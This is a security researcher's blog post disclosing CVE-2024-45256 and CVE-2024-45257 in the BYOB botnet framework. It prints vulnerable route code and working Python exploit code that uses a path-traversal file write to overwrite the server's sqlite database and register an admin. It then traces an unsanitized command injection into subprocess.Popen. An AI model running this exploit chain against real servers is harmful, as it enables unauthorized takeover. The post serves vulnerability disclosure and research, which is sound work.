<!doctype html>
<html lang="en-us">
  <head>
    <title>Unauthenticated remote code execution on BYOB via arbitrary file write (CVE-2024-45256) &#43; command injection (CVE-2024-45257) // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.140.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chebuya" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.a5031799cdaa4009a95a89643ef8be32c1d9e554e539288ba91b4fcfebcf8035.css" />

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Unauthenticated remote code execution on BYOB via arbitrary file write (CVE-2024-45256) &#43; command injection (CVE-2024-45257)">
  <meta name="twitter:description" content="PoC: https://github.com/chebuya/exploits/tree/main/BYOB-RCE Your browser does not support the video tag. Summary BYOB (Build Your Own Botnet) is an open-source post-exploitation framework for students, researchers and developers with support for Linux, Windows and OSX systems. With approximately 9,000 stars, it ranks among the most popular post exploitation frameworks on GitHub. While auditing the codebase, I was able to discover an unauthenticated arbitrary file write in an exfiltration endpoint allowing attackers to overwrite the sqlite database on disk and bypass authentication. With authenticated access to the botnet panel, I discovered a command injection in the payload generation page. By chaining these vulnerabilities, remote unauthenticated attackers are able to take full control over the botnet server.">

    <meta property="og:url" content="https://blog.chebuya.com/posts/unauthenticated-remote-command-execution-on-byob/">
  <meta property="og:title" content="Unauthenticated remote code execution on BYOB via arbitrary file write (CVE-2024-45256) &#43; command injection (CVE-2024-45257)">
  <meta property="og:description" content="PoC: https://github.com/chebuya/exploits/tree/main/BYOB-RCE Your browser does not support the video tag. Summary BYOB (Build Your Own Botnet) is an open-source post-exploitation framework for students, researchers and developers with support for Linux, Windows and OSX systems. With approximately 9,000 stars, it ranks among the most popular post exploitation frameworks on GitHub. While auditing the codebase, I was able to discover an unauthenticated arbitrary file write in an exfiltration endpoint allowing attackers to overwrite the sqlite database on disk and bypass authentication. With authenticated access to the botnet panel, I discovered a command injection in the payload generation page. By chaining these vulnerabilities, remote unauthenticated attackers are able to take full control over the botnet server.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T12:10:52-04:00">
    <meta property="article:modified_time" content="2024-08-15T12:10:52-04:00">


  </head>
  <body>
    <header class="app-header">
    <a href="https://blog.chebuya.com/"><img class="app-header-avatar" src="/avatar.jpg" alt="chebuya" /></a>

      <span class="app-header-title"></span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://www.linkedin.com/in/chebuya-%E2%80%8E-5a0a08294/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://packetstormsecurity.com/files/author/17026/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-spider">
  <title>Exploit-DB</title>
  <path d="M5 9C5 7.89543 5.89543 7 7 7H17C18.1046 7 19 7.89543 19 9V14C19 17.866 15.866 21 12 21V21C8.13401 21 5 17.866 5 14V9Z" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M8 6V5.57546C8 4.59379 8.38443 3.61462 9.32606 3.33713C10.8514 2.88762 13.1486 2.88762 14.6739 3.33713C15.6156 3.61462 16 4.59379 16 5.57546V6" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18.5 7.5L22 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5.5 7.5L2 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 18L2 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 12H1.5" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22.5 12H19" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18 18L22 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 13L12 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
          </a>
        
          <a href="https://hackerone.com/chebuya?type=user" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-hackerone">
  <title>HackerOne</title>
  <path d="M7.207 0c-.4836 0-.8774.1018-1.1823.3002-.3044.2003-.4592.4627-.4592.7798v21.809c0 .2766.1581.5277.4752.7609.315.2335.7031.3501 1.1664.3501.4427 0 .8306-.1166 1.1678-.3501.3352-.231.5058-.4843.5058-.761V1.0815c0-.319-.1623-.5769-.4893-.7813C8.0644.1018 7.6702 0 7.207 0zm9.5234 8.662c-.4836 0-.8717.0981-1.1683.3007l-4.439 2.7822c-.1988.1861-.2841.4687-.2473.855.0342.3826.2108.747.5238 1.0907.3145.346.6662.5626 1.0684.6547.3963.0899.6973.041.8962-.143l1.7551-1.0951v9.7817c0 .2767.1522.5278.4607.761.3007.2335.6873.3501 1.1504.3501.463 0 .863-.1166 1.1983-.3501.3371-.2332.5058-.4843.5058-.761V9.7381c0-.3193-.165-.577-.4898-.7754-.3252-.2026-.7288-.3007-1.2143-.3007z"/>
</svg>
          </a>
        
          <a href="https://github.com/chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>GitHub</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/_chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Unauthenticated remote code execution on BYOB via arbitrary file write (CVE-2024-45256) &#43; command injection (CVE-2024-45257)</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Aug 15, 2024
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          6 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>PoC: <a href="https://github.com/chebuya/exploits/tree/main/BYOB-RCE">https://github.com/chebuya/exploits/tree/main/BYOB-RCE</a> <!-- raw HTML omitted --></p>



<video width=100% controls autoplay>
    <source src="/byob-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>



<h3 id="summary">Summary</h3>
<p><a href="https://github.com/malwaredllc/byob">BYOB (Build Your Own Botnet)</a> is <em>an open-source post-exploitation framework for students, researchers and developers</em> with support for Linux, Windows and OSX systems.  With approximately 9,000 stars, it ranks among the most popular post exploitation frameworks on GitHub.  While auditing the codebase, I was able to discover an unauthenticated arbitrary file write in an exfiltration endpoint allowing attackers to overwrite the sqlite database on disk and bypass authentication.  With authenticated access to the botnet panel, I discovered a command injection in the payload generation page.  By chaining these vulnerabilities, remote unauthenticated attackers are able to take full control over the botnet server.</p>
<h3 id="arbitrary-file-write-via-agent-exfiltration-endpoint">Arbitrary File Write via agent exfiltration endpoint</h3>
<p>Reminiscent of the <em>Skywalker</em> in vulnerability in Empire C2 disclosed by <a href="https://x.com/zeroSteiner">@zeroSteiner</a> and <a href="https://aceresponder.com/blog/exploiting-empire-c2-framework">re-exploited by AceResponder</a>, the botnet backend saves exfiltrated files from agents in an insecure manner, allowing attackers to write files anywhere on the filesystem the user who is running the application has the permission to write to.  Specifically, the backend makes use of the <code>os.path.join</code> function, which is <a href="https://samy.blog/rtfm/">well known to create scenarios where directory traversal is possible</a>.</p>
<p>Lets take a look at the code (which I have trimmed down for brevity) for the <code>/api/file/add</code> route, which exists in <code>web-gui/buildyourownbotnet/api/files/routes.py</code>.   We can see this route accepts unauthenticated POST requests, and accepts a <code>filename</code> parameter.  This <code>filename</code> parameter is passed as the final parameter in the <code>output_path</code> variable, allowing us to take full control over the <code>output_path</code> variable irregardless of previous parameters by passing a full path (ex: <code>filename=/tmp/win.txt</code>).  Futhermore, the route accepts a <code>data</code> parameter, which is to be base64-decoded and written to <code>output_path</code>.  This gives way to our arbitrary file write.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@files.route</span>(<span style="color:#e6db74">&#34;/api/file/add&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file_add</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;&#34;&#34;Upload new exfilrated file.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>	b64_data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	filename <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;filename&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># decode any base64 values</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_data)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> b64_data<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;_b64&#39;</span>):
</span></span><span style="display:flex;"><span>			data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b64_data[<span style="color:#ae81ff">6</span>:])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">&#39;/api/file/add error: invalid data &#39;</span> <span style="color:#f92672">+</span> str(b64_data))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	output_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#39;buildyourownbotnet/output&#39;</span>, owner, <span style="color:#e6db74">&#39;files&#39;</span>, filename)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># add exfiltrated file to database</span>
</span></span><span style="display:flex;"><span>	file_dao<span style="color:#f92672">.</span>add_user_file(owner, filename, session, module)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># save exfiltrated file to user directory</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(output_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
</span></span><span style="display:flex;"><span>		fp<span style="color:#f92672">.</span>write(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> filename
</span></span></code></pre></div><p>We need to leverage this arbitrary file write to RCE now. There are <a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">a lot of ways to do this</a> but ideally: <br>
- Our path does not rely on the application running with elevated/root permissions, since unlike empire its not likely the botnet server is running with root perms (writing to /etc/cron.d) <br>
- Our path does not rely on system event (login-&gt;.bashrc, overwriting app source files and waiting for reload) <br>
- Our path does not rely on a user loading a webpage or something (adding an XSS payload to an application .js file)</p>
<p>The best way I found to achieve this is to overwrite the sqlite3 database that exists on file to one with empty tables. This resets the application to its initial installation state, and allows us to register an admin user as part of the setup process. After that, we can focus on the authenticated attack surface which will probably be easier to RCE from. We make use of procfs to determine the working directory of the application, from which we can find the location of the database (<code>/proc/self/cwd/instance/database.db</code>).  The downside of doing this is the botnets owners will probably notice not being able to login.</p>
<p>This is what overwriting the database and registering a new user looks like in python code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;database.db&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>	bindata <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(bindata)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)
</span></span><span style="display:flex;"><span>json_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;data&#39;</span>: data, <span style="color:#e6db74">&#39;filename&#39;</span>: <span style="color:#e6db74">&#39;/proc/self/cwd/instance/database.db&#39;</span>, <span style="color:#e6db74">&#39;type&#39;</span>: <span style="color:#e6db74">&#34;txt&#34;</span>, <span style="color:#e6db74">&#39;owner&#39;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;module&#34;</span>: <span style="color:#e6db74">&#34;icloud&#34;</span>, <span style="color:#e6db74">&#34;session&#34;</span>: <span style="color:#e6db74">&#34;lol&#34;</span>}
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;Content-Length&#39;</span>: str(len(json<span style="color:#f92672">.</span>dumps(json_data)))
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[***] Uploading database&#34;</span>)
</span></span><span style="display:flex;"><span>upload_response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/file/add&#34;</span>, data<span style="color:#f92672">=</span>json_data, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>print(upload_response<span style="color:#f92672">.</span>status_code)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;User-Agent&#39;</span>: user_agent,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;csrf_token&#39;</span>: register_csrf,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;username&#39;</span>: username,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;password&#39;</span>: password,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;confirm_password&#39;</span>: password,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;submit&#39;</span>: <span style="color:#e6db74">&#39;Sign Up&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[***] Registering user   &#34;</span>)
</span></span><span style="display:flex;"><span>register_response <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/register&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>print(register_response<span style="color:#f92672">.</span>status_code)
</span></span></code></pre></div><h3 id="command-injection-via-payload-generation-page">Command Injection via payload generation page</h3>
<p>The payload generation page accepts a format, operating system and architecture parameter.</p>
<p><img src="/generation-page.png" alt="meow1"></p>
<p>This page will POST to the <code>/api/payload/generate</code> page, which will accept the <code>payload_format</code>, <code>operating_system</code>, and <code>architecture</code> parameters.  These parameters will be put into an <code>options</code> directory and passed to the client.py <code>main()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@payload.route</span>(<span style="color:#e6db74">&#34;/api/payload/generate&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload_generate</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;&#34;&#34;Generates custom client scripts.&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># required fields</span>
</span></span><span style="display:flex;"><span>	payload_format <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;format&#39;</span>)
</span></span><span style="display:flex;"><span>	operating_system <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;operating_system&#39;</span>)
</span></span><span style="display:flex;"><span>	architecture <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;architecture&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># write dropper to user&#39;s output directory and return client creation page</span>
</span></span><span style="display:flex;"><span>	options <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;encrypt&#39;</span>: encrypt,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;compress&#39;</span>: compress, 
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;freeze&#39;</span>: freeze, 
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;gui&#39;</span>: <span style="color:#ae81ff">1</span>, 
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;owner&#39;</span>: current_user<span style="color:#f92672">.</span>username, 
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;operating_system&#39;</span>: operating_system, 
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#39;architecture&#39;</span>: architecture
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		outfile <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>main(<span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#f92672">**</span>options)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">...</span>
</span></span></code></pre></div><p>In the main function, these options are processed and passed to the <code>_dropper()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># main</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Run the generator
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> kwargs:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        options <span style="color:#f92672">=</span> collections<span style="color:#f92672">.</span>namedtuple(<span style="color:#e6db74">&#39;Options&#39;</span>, [<span style="color:#e6db74">&#39;host&#39;</span>,<span style="color:#e6db74">&#39;port&#39;</span>,<span style="color:#e6db74">&#39;modules&#39;</span>,<span style="color:#e6db74">&#39;name&#39;</span>,<span style="color:#e6db74">&#39;icon&#39;</span>,<span style="color:#e6db74">&#39;pastebin&#39;</span>,<span style="color:#e6db74">&#39;encrypt&#39;</span>,<span style="color:#e6db74">&#39;compress&#39;</span>,<span style="color:#e6db74">&#39;freeze&#39;</span>,<span style="color:#e6db74">&#39;gui&#39;</span>,<span style="color:#e6db74">&#39;owner&#39;</span>,<span style="color:#e6db74">&#39;operating_system&#39;</span>,<span style="color:#e6db74">&#39;architecture&#39;</span>])(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    dropper <span style="color:#f92672">=</span> _dropper(options, var<span style="color:#f92672">=</span>var, key<span style="color:#f92672">=</span>key, modules<span style="color:#f92672">=</span>modules, imports<span style="color:#f92672">=</span>imports, hidden<span style="color:#f92672">=</span>hidden, url<span style="color:#f92672">=</span>stager)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#39;..&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> dropper
</span></span></code></pre></div><p>The <code>_dropper</code> function, which is responsible for generating the dropper, constructs the <code>name</code> variable which is the output path for our generated droppers.  We notice that options.operating_system and options.architecture are used in the construction of the <code>name</code> variable.  If the <code>name</code> variable ever gets passed to a <code>subprocess.Popen</code> call, we will be able to inject commands.  We can see that if <code>options.freeze</code> is set to true (which is the case when you request to generate a binary dropper rather than a .py dropper), the <code>generators.freeze()</code> function will be called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_dropper</span>(options, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># add os/arch info to filename if freezing</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>freeze:
</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;byob_</span><span style="color:#e6db74">{operating_system}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{architecture}</span><span style="color:#e6db74">_</span><span style="color:#e6db74">{var}</span><span style="color:#e6db74">.py&#39;</span><span style="color:#f92672">.</span>format(operating_system<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>operating_system, architecture<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>architecture, var<span style="color:#f92672">=</span>kwargs[<span style="color:#e6db74">&#39;var&#39;</span>]) <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> options<span style="color:#f92672">.</span>name <span style="color:#66d9ef">else</span> options<span style="color:#f92672">.</span>name
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;byob_</span><span style="color:#e6db74">{var}</span><span style="color:#e6db74">.py&#39;</span><span style="color:#f92672">.</span>format(var<span style="color:#f92672">=</span>kwargs[<span style="color:#e6db74">&#39;var&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(output_dir, name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># cross-compile executable for the specified os/arch using pyinstaller docker containers</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>freeze:
</span></span><span style="display:flex;"><span>        util<span style="color:#f92672">.</span>display(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Compiling executable...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;reset&#39;</span>, style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;normal&#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> generators<span style="color:#f92672">.</span>freeze(name, icon<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>icon, hidden<span style="color:#f92672">=</span>kwargs[<span style="color:#e6db74">&#39;hidden&#39;</span>], owner<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>owner, operating_system<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>operating_system, architecture<span style="color:#f92672">=</span>options<span style="color:#f92672">.</span>architecture)
</span></span><span style="display:flex;"><span>        util<span style="color:#f92672">.</span>display(<span style="color:#e6db74">&#39;(</span><span style="color:#e6db74">{:,}</span><span style="color:#e6db74"> bytes saved to file: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(len(open(name, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()), name))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> name
</span></span></code></pre></div><p>In the <code>freeze()</code> function, the <code>operating_system</code> parameter and <code>architecture</code> parameter are passed directly into <code>subprocess.Popen()</code>, without any sanitization or validation whatsoever.</p>
